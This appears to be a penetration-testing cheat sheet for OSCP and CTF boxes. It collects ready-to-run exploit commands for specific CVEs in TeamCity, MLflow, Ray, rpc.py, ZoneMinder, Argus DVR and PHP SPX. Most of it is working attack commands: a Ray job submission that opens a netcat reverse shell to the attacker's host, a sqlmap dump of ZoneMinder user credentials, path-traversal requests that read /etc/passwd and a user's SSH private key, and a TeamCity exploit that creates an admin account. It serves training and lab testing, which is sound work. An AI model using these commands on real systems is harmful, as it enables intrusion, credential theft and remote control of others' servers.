title: Service RCE Collection — TeamCity, MLflow, Ray, rpc.py, ZoneMinder, Argus DVR
body: RCE vulnerabilities in specific services and platforms that appear on OSCP/CTF boxes. Each has the same workflow: fingerprint the service → confirm version → run exploit. Most are authenticated but several are pre-auth.
cmd:
# ══════════════════════════════════════════════════
# TEAMCITY CVE-2024-27198 (pre-auth RCE)
# ══════════════════════════════════════════════════
# Fingerprint: TeamCity in page title, default port 8111
# Pre-auth — no credentials needed
python3 CVE-2024-27198-RCE.py -t http://<IP>:8111 -u admin -p admin -f
# https://github.com/W01fh4cker/CVE-2024-27198-RCE
# Creates an admin account then achieves RCE

# ══════════════════════════════════════════════════
# MLFLOW CVE-2023-1177 (path traversal → file read)
# ══════════════════════════════════════════════════
# Fingerprint: MLflow UI on port 5000 or 8080
# Exploit: path traversal to read arbitrary files
# https://github.com/iumiro/CVE-2023-1177-MLFlow
python3 exploit.py -u http://<IP>:5000 -f /etc/passwd

# MLflow CVE-2024-2928 (CLI RCE):
python3 CVE-2024-2928.py -t http://<IP>:5000 -p 80
# https://raw.githubusercontent.com/nuridincersaygili/CVE-2024-2928/refs/heads/main/CVE-2024-2928.py

# ══════════════════════════════════════════════════
# RAY OS CVE-2023-6019 (unauthenticated RCE)
# ══════════════════════════════════════════════════
# Fingerprint: Ray Dashboard on port 8265
# The /api/jobs/ endpoint allows unauthenticated job submission
curl -X POST http://<IP>:8265/api/jobs/ \
  -H 'Content-Type: application/json' \
  -d '{"entrypoint": "busybox nc <LHOST> <LPORT> -e /bin/sh", "runtime_env": {}}'
# https://github.com/Clydeston/CVE-2023-6019

# ══════════════════════════════════════════════════
# RPC.PY CVE-2022-35411 (unauthenticated RCE)
# ══════════════════════════════════════════════════
# Fingerprint: rpc.py service, Python RPC endpoint
# Exploit (EDB 50983):
python3 50983.py http://<IP>:<PORT>
# https://www.exploit-db.com/exploits/50983

# ══════════════════════════════════════════════════
# ZONEMINDER CVE-2024-51482 (SQLi → dump users)
# ══════════════════════════════════════════════════
# Fingerprint: ZoneMinder CCTV platform
sqlmap -u 'http://<IP>/zm/index.php?view=request&request=event&action=removetag&tid=1' \
  --dbms=MySQL -D zm -T Users --dump
# Crack hashed passwords or look for admin creds to exploit further

# ══════════════════════════════════════════════════
# ARGUS SURVEILLANCE DVR (path traversal → file read)
# ══════════════════════════════════════════════════
# Fingerprint: Argus DVR web interface on 8080
# Read SSH private key:
curl "http://<IP>:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=../../../../../../../../../../../../../../Users/<USER>/.ssh/id_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
# EDB 45296 (LFI) and EDB 50130 (RCE) also available
searchsploit argus dvr

# ══════════════════════════════════════════════════
# PHP SPX CVE-2024-42007 (path traversal)
# ══════════════════════════════════════════════════
# Fingerprint: ?SPX_KEY= parameter in URL, PHP profiling tool
curl "http://<IP>/?SPX_KEY=a2a90ca2f9f0ea04d267b16fb8e63800&SPX_UI_URI=../../../../../../../../../../../../../../var/www/html/phpinfo.php"
# https://github.com/suljov/CVE-2024-42007
go run exploit.go -t http://<IP>
warn: TeamCity CVE-2024-27198 creates a new admin account on the target — note this in your report and remove it when done. MLflow is commonly found in AI/ML lab environments. Ray is common in distributed computing setups. For ZoneMinder the SQLi parameter is in the URL query string and sqlmap handles the rest — just make sure you have a session cookie if auth is required.
